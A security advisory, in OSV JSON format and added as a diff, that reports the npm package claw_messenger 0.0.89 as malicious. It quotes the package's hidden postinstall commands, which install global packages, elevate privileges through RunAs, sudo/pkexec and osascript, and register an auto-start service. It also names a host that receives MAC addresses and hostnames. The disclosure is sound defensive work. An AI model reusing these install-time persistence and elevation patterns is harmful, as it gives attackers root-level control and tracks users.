@@ -1,0 +1,85 @@
+{
+  "modified": "2026-06-12T19:07:40Z",
+  "published": "2026-06-12T19:07:40Z",
+  "schema_version": "1.7.4",
+  "id": "",
+  "summary": "claw_messenger postinstall silently installs unpinned third-party packages globally and registers a privileged system service",
+  "details": "The postinstall lifecycle script in dist/postinstall.js spawns two detached, hidden child processes during `npm install`. (1) `spawn('npm', ['install', '-g', 'opencode-ai', '--registry=https://registry.npmmirror.com',...], { shell: true, detached: true, stdio: 'ignore', windowsHide: true })` silently performs a global `npm install` of `opencode-ai` from a non-default registry mirror. opencode-ai is not declared in package.json or documented in the README, so the package surreptitiously expands the installer's globally-installed package surface to undocumented third-party code that the author or any future hijacker of that name can mutate. (2) An update-silent-service flow loads dist/service-installer.js which runs `execSync('npm install -g claw-subagent-service@latest', { stdio: 'inherit', timeout: 120000 })` against a mutable `@latest` tag, then dist/daemon-manager.js elevates and registers the resulting binary as a privileged auto-start system service: on Windows via `Start-Process sc -ArgumentList 'start claw-subagent-service' -Verb RunAs`, on Linux via systemd with `pkexec`/`sudo`, on macOS via `osascript... with administrator privileges`. The combination — install-time, hidden, no-consent, unpinned remote dependency fetch followed by privileged auto-start service registration — gives the author (and anyone who later compromises `opencode-ai` or `claw-subagent-service`) persistent root/Administrator code execution on every machine that installs claw_messenger. Separately, dist/auto-register.js posts the host's MAC address and hostname to https://newsradar.dreamdt.cn/im/api/claw/register on plugin load, which is undocumented device-tracking telemetry but is secondary to the install-time RCE surface.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "claw_messenger"
+      },
+      "versions": [
+        "0.0.89"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "dist/postinstall.js",
+              "sha256": "975dcf800a08008605a42c479fe050db36b11dea33ce9632fcc65df290362d77",
+              "tlsh": "4841216a45aa01771f4389991d0b943f272216029158f124facedf5f1793e2d89932fe"
+            },
+            {
+              "path": "dist/service-installer.js",
+              "sha256": "30b778b2ae1d143af030df38d7884b199a32f9440003e03480280110e8ee4bc1",
+              "tlsh": "32e1eb8915f315385b73f8addb8b841a63264003500eef48fe8da6645f9336867f1be9"
+            },
+            {
+              "path": "dist/auto-register.js",
+              "sha256": "0d0acd44d14b8579e0cad4a335cd48e027bbdb8a0edca48a3548b1dd2532dbc8",
+              "tlsh": "891274d6adfb142e02526859cb5f50247214be872748c458fbccc6d4bfa4914e9a3bf8"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "claw_messenger-0.0.89.tgz",
+              "hashes": {
+                "sha1": "a03bf6d956d09182d501ed8c584452dbf12515fb",
+                "sha512_sri": "sha512-3rHDmd4QK9nd+KQia8RVnHoby9XEdBst2SflF+UqcH6xGG9I8KidazBbXOLqJvaGq+sDXFyOtq4OFUXoUYbIog=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/claw_messenger/v/0.0.89"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "inspector-research@amazon.com"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "source": "amazon-inspector",
+        "sha256": "b621afa50fe31026a12750b83eeb309366f95b07a9e0c5095d3e862f0007b70f",
+        "import_time": "2026-06-12T19:44:01.118578755Z",
+        "id": "IN-MAL-2026-006039",
+        "modified_time": "2026-06-12T19:07:40Z",
+        "versions": [
+          "0.0.89"
+        ]
+      }
+    ]
+  }
+}
